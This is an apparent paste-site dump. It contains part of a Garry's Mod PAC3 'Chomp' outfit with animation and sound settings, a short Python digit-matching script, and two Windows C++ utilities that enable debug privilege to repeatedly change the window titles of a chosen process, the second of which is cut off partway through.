,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck1\"":{\""RU\"":-12.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Tail01\"":{\""RU\"":5.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_Femur\"":{\""RU\"":4.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigScull\"":{\""RU\"":9.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Humerus\"":{\""RU\"":5.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_PhalangesManus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0}}},{\""FrameRate\"":5.0,\""BoneInfo\"":{\""LrigPelvis\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":4.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_Femur\"":{\""RU\"":-8.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck3\"":{\""RU\"":-4.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Metacarpus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck2\"":{\""RU\"":-1.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-1.0,\""MF\"":1.0,\""RF\"":0.0},\""Lrig_LEG_BL_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Jaw\"":{\""RU\"":11.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-1.5,\""MF\"":-0.800000011920929,\""RF\"":0.0},\""Lrig_LEG_FL_Radius\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_Humerus\"":{\""RU\"":-9.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck1\"":{\""RU\"":22.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Tail01\"":{\""RU\"":-10.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_Femur\"":{\""RU\"":-8.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigScull\"":{\""RU\"":-8.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Humerus\"":{\""RU\"":-9.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_PhalangesManus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0}}},{\""FrameRate\"":5.0,\""BoneInfo\"":{\""LrigPelvis\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":5.0,\""RF\"":0.0},\""Lrig_LEG_BL_Femur\"":{\""RU\"":-10.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck3\"":{\""RU\"":-1.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Metacarpus\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_FrontHoof\"":{\""RU\"":-5.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigScull\"":{\""RU\"":-8.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_RearHoof\"":{\""RU\"":-5.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_FrontHoof\"":{\""RU\"":-5.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Jaw\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Radius\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_Humerus\"":{\""RU\"":-11.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck1\"":{\""RU\"":22.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-1.0,\""MF\"":-1.0,\""RF\"":0.0},\""Lrig_LEG_BR_RearHoof\"":{\""RU\"":-5.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Tail01\"":{\""RU\"":-12.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_Femur\"":{\""RU\"":-10.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck2\"":{\""RU\"":-1.0,\""MU\"":0.0,\""MF\"":1.0,\""MR\"":-1.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Humerus\"":{\""RU\"":-11.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_PhalangesManus\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":-0.0,\""MF\"":0.0,\""RF\"":0.0}}},{\""FrameRate\"":5.0,\""BoneInfo\"":{\""LrigPelvis\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":-2.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_Femur\"":{\""RU\"":4.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck3\"":{\""RU\"":14.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":-0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Metacarpus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigScull\"":{\""RU\"":9.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Jaw\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Radius\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_Humerus\"":{\""RU\"":5.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck1\"":{\""RU\"":-12.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Tail01\"":{\""RU\"":5.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_Femur\"":{\""RU\"":4.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck2\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Humerus\"":{\""RU\"":5.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_PhalangesManus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0}}},{\""FrameRate\"":3.3333333333333337,\""BoneInfo\"":{\""LrigPelvis\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_Femur\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck3\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Metacarpus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""LrigNeck2\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_FrontHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Jaw\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Radius\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FR_Humerus\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigNeck1\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BR_RearHoof\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Tail01\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0},\""Lrig_LEG_BL_Femur\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""LrigScull\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_Humerus\"":{\""RU\"":0.0,\""MU\"":0.0,\""RR\"":0.0,\""MR\"":0.0,\""MF\"":0.0,\""RF\"":0.0},\""Lrig_LEG_FL_PhalangesManus\"":{\""RU\"":0.0,\""MU\"":0.0,\""MF\"":0.0,\""MR\"":0.0,\""RR\"":0.0,\""RF\"":0.0}}}],\""Interpolation\"":\""linear\""}"",
						[""StopOtherAnimations""] = false,
					},
				},
				[2] = {
					[""children""] = {
						[1] = {
							[""children""] = {
								[1] = {
									[""children""] = {
										[1] = {
											[""children""] = {
											},
											[""self""] = {
												[""DrawOrder""] = 0,
												[""UniqueID""] = ""45f8a2b3459082721773a7a41b04e9e41763b9184dce6ca33ee6d8bbcddb09c0"",
												[""Axis""] = """",
												[""Input""] = ""time"",
												[""TargetPartUID""] = """",
												[""InputMultiplier""] = 1,
												[""RootOwner""] = false,
												[""TargetEntityUID""] = """",
												[""ZeroEyePitch""] = false,
												[""ClassName""] = ""proxy"",
												[""ResetVelocitiesOnHide""] = true,
												[""VelocityRoughness""] = 10,
												[""Max""] = 0,
												[""Pow""] = 1,
												[""EditorExpand""] = false,
												[""AffectChildren""] = false,
												[""Min""] = 0,
												[""Hide""] = false,
												[""Name""] = """",
												[""VariableName""] = ""Weight"",
												[""Offset""] = 0,
												[""PlayerAngles""] = false,
												[""Additive""] = false,
												[""InputDivider""] = 1,
												[""IsDisturbing""] = false,
												[""OutputTargetPartUID""] = """",
												[""Function""] = ""sin"",
												[""Expression""] = ""clamp(timeex()*6,0,0.3)"",
											},
										},
									},
									[""self""] = {
										[""DrawOrder""] = 0,
										[""UniqueID""] = ""e7946f16b33657143b570c1cce60845ba1ac5abf17e217f1f5ae1bcf44efd76c"",
										[""Flex""] = ""angry_eyes"",
										[""Hide""] = false,
										[""TargetEntityUID""] = """",
										[""EditorExpand""] = true,
										[""Additive""] = false,
										[""Name""] = """",
										[""IsDisturbing""] = false,
										[""Weight""] = 0.3,
										[""RootOwner""] = false,
										[""ClassName""] = ""flex"",
									},
								},
							},
							[""self""] = {
								[""AffectChildrenOnly""] = true,
								[""DrawOrder""] = 0,
								[""TargetPartUID""] = """",
								[""Name""] = """",
								[""Event""] = ""timerx"",
								[""Hide""] = false,
								[""TargetEntityUID""] = """",
								[""RootOwner""] = true,
								[""EditorExpand""] = true,
								[""ClassName""] = ""event"",
								[""Arguments""] = ""0.6@@1"",
								[""Invert""] = false,
								[""IsDisturbing""] = false,
								[""Operator""] = ""equal or above"",
								[""UniqueID""] = ""857b65b4d87ad6dabd4313125c953072a9c0c9197877752946450caf3b20c041"",
								[""ZeroEyePitch""] = false,
							},
						},
					},
					[""self""] = {
						[""AffectChildrenOnly""] = true,
						[""DrawOrder""] = 0,
						[""TargetPartUID""] = """",
						[""Name""] = ""Flex"",
						[""Event""] = ""timerx"",
						[""Hide""] = false,
						[""TargetEntityUID""] = """",
						[""RootOwner""] = true,
						[""EditorExpand""] = false,
						[""ClassName""] = ""event"",
						[""Arguments""] = ""0.1@@1"",
						[""Invert""] = true,
						[""IsDisturbing""] = false,
						[""Operator""] = ""equal or above"",
						[""UniqueID""] = ""e507b2bb454dcdd87377426f64046580bf6c5ee32bbc6db56c7b7bfba3bd88dd"",
						[""ZeroEyePitch""] = false,
					},
				},
				[3] = {
					[""children""] = {
						[1] = {
							[""children""] = {
							},
							[""self""] = {
								[""Path""] = ""https://www.dropbox.com/scl/fi/plrlff0t5fstbwmgpdpvq/Chomp2.mp3?rlkey=5pslpnob26hg6k0bsst0t5h7r&st=t83byb7m&dl=1"",
								[""UniqueID""] = ""1bcc3e13a3ba4372055b8d6f08c806039d6943514fd4b8333a90740d6c834ebc"",
								[""AimPartName""] = """",
								[""SequentialStep""] = 1,
								[""AimPartUID""] = """",
								[""Name""] = """",
								[""EchoFeedback""] = 0.75,
								[""AngleOffset""] = Angle(0, 0, 0),
								[""PlayOnFootstep""] = false,
								[""Radius""] = 1000,
								[""IsDisturbing""] = false,
								[""EyeAngles""] = false,
								[""VolumeLFOAmount""] = 0,
								[""DrawOrder""] = 0,
								[""VolumeLFOTime""] = 0,
								[""TargetEntityUID""] = """",
								[""Echo""] = false,
								[""Sequential""] = false,
								[""Pitch""] = 1,
								[""PlayCount""] = 1,
								[""PitchLFOTime""] = 0,
								[""FilterType""] = 0,
								[""PitchLFOAmount""] = 0,
								[""FilterFraction""] = 1,
								[""MaxPitch""] = 0,
								[""EchoDelay""] = 0.5,
								[""StopOnHide""] = false,
								[""PauseOnHide""] = false,
								[""Doppler""] = false,
								[""Volume""] = 1,
								[""Hide""] = false,
								[""Overlapping""] = false,
								[""EditorExpand""] = false,
								[""PositionOffset""] = Vector(0, 0, 0),
								[""ClassName""] = ""sound2"",
								[""Angles""] = Angle(0, 0, 0),
								[""Bone""] = ""head"",
								[""Position""] = Vector(0, 0, 0),
								[""MinPitch""] = 0,
							},
						},
					},
					[""self""] = {
						[""AffectChildrenOnly""] = true,
						[""DrawOrder""] = 0,
						[""TargetPartUID""] = """",
						[""Name""] = ""Sound"",
						[""Event""] = ""timerx"",
						[""Hide""] = false,
						[""TargetEntityUID""] = """",
						[""RootOwner""] = true,
						[""EditorExpand""] = false,
						[""ClassName""] = ""event"",
						[""Arguments""] = ""0.4@@1"",
						[""Invert""] = true,
						[""IsDisturbing""] = false,
						[""Operator""] = ""equal or above"",
						[""UniqueID""] = ""4bd4c68fa7601290d5dd10a7f0737b3d73799d47a4e81b45779394855cae1333"",
						[""ZeroEyePitch""] = false,
					},
				},
			},
			[""self""] = {
				[""AffectChildrenOnly""] = true,
				[""DrawOrder""] = 0,
				[""TargetPartUID""] = """",
				[""Name""] = """",
				[""Event""] = ""button"",
				[""Hide""] = false,
				[""TargetEntityUID""] = """",
				[""RootOwner""] = true,
				[""EditorExpand""] = false,
				[""ClassName""] = ""event"",
				[""Arguments""] = ""r"",
				[""Invert""] = true,
				[""IsDisturbing""] = false,
				[""Operator""] = ""find simple"",
				[""UniqueID""] = ""09a16ca913d7c7534974666854a22fc2107962d5b070ff6244603377e421c4df"",
				[""ZeroEyePitch""] = false,
			},
		},
		[2] = {
			[""children""] = {
			},
			[""self""] = {
				[""Outline""] = 0,
				[""UniqueID""] = ""a8a4ef6fba40b82ffffe033056b970ad5c330659dab01a9ea9c98bd2233e98be"",
				[""FontOutline""] = false,
				[""AimPartName""] = """",
				[""FontAdditive""] = false,
				[""IgnoreZ""] = false,
				[""FontBlurSize""] = 0,
				[""AimPartUID""] = """",
				[""FontScanLines""] = 0,
				[""ForceAdditive""] = false,
				[""Name""] = ""Made by Cleffy <3"",
				[""DynamicTextValue""] = 0,
				[""VerticalTextAlign""] = 1,
				[""NoTextureFiltering""] = false,
				[""FontAntialias""] = true,
				[""Font""] = ""default"",
				[""IsDisturbing""] = false,
				[""CustomFont""] = ""DermaDefault"",
				[""EyeAngles""] = false,
				[""FontSize""] = 13,
				[""Bone""] = ""head"",
				[""DrawOrder""] = 0,
				[""BlendMode""] = """",
				[""Angles""] = Angle(0, 0, 0),
				[""Shadow""] = false,
				[""FontItalic""] = false,
				[""TargetEntityUID""] = """",
				[""FontRotary""] = false,
				[""Alpha""] = 1,
				[""TextOverride""] = ""Text"",
				[""FontWeight""] = 500,
				[""PositionOffset""] = Vector(0, 0, 0),
				[""FontUnderline""] = false,
				[""OutlineColor""] = Vector(255, 255, 255),
				[""DrawMode""] = ""DrawTextOutlined"",
				[""Color""] = Vector(255, 255, 255),
				[""HorizontalTextAlign""] = 1,
				[""ConcatenateTextAndOverrideValue""] = false,
				[""Position""] = Vector(0, 0, 0),
				[""Translucent""] = true,
				[""Text""] = """",
				[""Hide""] = false,
				[""TextPosition""] = ""Prefix"",
				[""CreateCustomFont""] = false,
				[""OutlineAlpha""] = 1,
				[""EditorExpand""] = false,
				[""Size""] = 1,
				[""ClassName""] = ""text"",
				[""FontStrikeout""] = false,
				[""RoundingPosition""] = 2,
				[""AngleOffset""] = Angle(0, 0, 0),
				[""FontSymbol""] = false,
			},
		},
	},
	[""self""] = {
		[""DrawOrder""] = 0,
		[""UniqueID""] = ""65dba610e5eb2f2cc06dd2185649bc4cc6227fcd5fcdaa04234e1befdbd4d5ef"",
		[""Hide""] = false,
		[""TargetEntityUID""] = """",
		[""EditorExpand""] = false,
		[""OwnerName""] = ""self"",
		[""IsDisturbing""] = false,
		[""Name""] = ""Chomp (Hold R)"",
		[""Duplicate""] = false,
		[""ClassName""] = ""group"",
	},
},
"
g5GXNfnX,Untitled,nq1s788,Python,Saturday 29th of June 2024 04:22:39 AM CDT,"a = input()
b = input()
x = [0] * 10
y = [0] * 10
for i in range(10):
    x[i] = a.count(str(i))
    y[i] = b.count(str(i))
for i in range(9, -1, -1):
    print(str(i) * min(x[i], y[i]), end='')"
5vN2ERdz,AdvTitleChanger,alien_fx_fiend,C++,Saturday 29th of June 2024 04:22:28 AM CDT,"#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <iostream>
#include <vector>

#pragma comment(lib, ""Psapi.lib"")

struct ProcessInfo {
    std::wstring processName;
    HWND hwnd;
};

std::vector<ProcessInfo> targetProcesses;
bool running = true;

// Function to set privileges
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcout << L""LookupPrivilegeValue error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::wcout << L""AdjustTokenPrivileges error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::wcout << L""The token does not have the specified privilege. \n"" << std::endl;
        return FALSE;
    }

    return TRUE;
}

// Callback function for EnumWindows
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        TCHAR szProcessName[MAX_PATH] = TEXT(""<unknown>"");
        if (GetModuleFileNameEx(hProcess, NULL, szProcessName, MAX_PATH)) {
            std::wstring processName(szProcessName);
            size_t pos = processName.find_last_of(L""\\"");
            if (pos != std::wstring::npos) {
                processName = processName.substr(pos + 1);
            }
            CloseHandle(hProcess);

            TCHAR windowTitle[MAX_PATH];
            GetWindowText(hwnd, windowTitle, MAX_PATH);

            if (processName == *(std::wstring*)lParam) {
                targetProcesses.push_back({ processName, hwnd });
            }
        }
        else {
            std::wcout << L""GetModuleFileNameEx error: "" << GetLastError() << std::endl;
        }
    }
    return TRUE;
}

// Function to modify window titles
bool ModifyWindowTitles(const std::wstring& newTitle) {
    bool anyModified = false;
    for (const auto& process : targetProcesses) {
        if (SetWindowText(process.hwnd, newTitle.c_str())) {
            anyModified = true;
            std::wcout << L""Modified window title of "" << process.processName << std::endl;
        }
        else {
            std::wcout << L""Failed to modify window title of "" << process.processName << std::endl;
        }
    }
    return anyModified;
}

// Thread function to persistently modify window titles
DWORD WINAPI TitleModifierThread(LPVOID lpParam) {
    std::wstring newTitle = *(std::wstring*)lpParam;
    while (running) {
        ModifyWindowTitles(newTitle);
        Sleep(1000);
    }
    return 0;
}

int main() {
    std::wstring processName;
    std::wcout << L""Enter the process name (e.g., notepad.exe): "";
    std::getline(std::wcin, processName);

    std::wstring newTitle;
    std::wcout << L""Enter the new window title text: "";
    std::getline(std::wcin, newTitle);

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcout << L""OpenProcessToken error: "" << GetLastError() << std::endl;
        return 1;
    }

    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        std::wcout << L""Failed to enable debug privilege."" << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    EnumWindows(EnumWindowsProc, (LPARAM)&processName);

    if (targetProcesses.empty()) {
        std::wcout << L""No windows found for process: "" << processName << std::endl;
    }
    else {
        HANDLE hThread = CreateThread(NULL, 0, TitleModifierThread, &newTitle, 0, NULL);
        if (hThread == NULL) {
            std::wcout << L""Failed to create thread."" << std::endl;
            return 1;
        }

        std::wcout << L""Window titles are being modified. Press Enter to stop and exit..."" << std::endl;
        std::cin.get();

        running = false;
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    SetPrivilege(hToken, SE_DEBUG_NAME, FALSE);
    CloseHandle(hToken);

    return 0;
}
"
iGJgmZne,Message-Based-Hooking,alien_fx_fiend,C++,Saturday 29th of June 2024 04:20:20 AM CDT,"#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <iostream>
#include <vector>

#pragma comment(lib, ""Psapi.lib"")

struct ProcessInfo {
    std::wstring processName;
    HWND hwnd;
};

std::vector<ProcessInfo> targetProcesses;
bool running = true;

// ... [Keep the SetPrivilege function as it is] ...
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;


    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcout << L""LookupPrivilegeValue error: "" << GetLastError() << std::endl;
        return FALSE;
    }

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
    std::wcout << L""AdjustTokenPrivileges error: "" << GetLastError() << std::endl;
    return FALSE;
}

if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
    std::wcout << L""The token does not have the specified privilege. \n"" << std::endl;
    return FALSE;
}

return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        TCHAR szProcessName[MAX_PATH] = TEXT(""<unknown>"");
        if (GetModuleFileNameEx(hProcess, NULL, szProcessName, MAX_PATH)) {
            std::wstring processName(szProcessName);
            size_t pos = processName.find_last_of(L""\\"");
            if (pos != std::wstring::npos) {
                processName = processName.substr(pos + 1);
            }
            CloseHandle(hProcess);

            TCHAR windowTitle[MAX_PATH];
            GetWindowText(hwnd, windowTitle, MAX_PATH);

            std::wcout << L""Process: "" << processName << L"", Window Title: "" << windowTitle << std::endl;

            if (processName == L""notepad.exe"" || processName == L""notepad++.exe"") {
                targetProcesses.push_back({ processName, hwnd });
            }
        }
        else {
            std::wcout << L""GetModuleFileNameEx error: "" << GetLastError() << std::endl;
        }
    }
    return TRUE;
}

bool ModifyWindowTitles() {
    bool anyModified = false;
    for (const auto& process : targetProcesses) {
        std::wstring newTitle = L""Wormhole Vortex"";
        if (SetWindowText(process.hwnd, newTitle.c_str())) {
            anyModified = true;
                        std::wcout << L""Modified window title of "" << process.processName << std::endl;

        }

        else {

            std::wcout << L""Failed to modify window title of "" << process.processName << std::endl;
        }
    }
    return anyModified;
}

void RestoreWindowTitles() {
    for (const auto& process : targetProcesses) {
                if (SetWindowText(process.hwnd, process.processName.c_str())) {

            std::wcout << L""Restored window title of "" << process.processName << std::endl;

        }

        else {

            std::wcout << L""Failed to restore window title of "" << process.processName << std::endl;

        }
    }
}

DWORD WINAPI TitleModifierThread(LPVOID lpParam) {
    while (running) {
        ModifyWindowTitles();
        Sleep(1000);
    }
    return 0;
}

int main() {
    // ... [Keep the privilege setting code as it is] ...
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
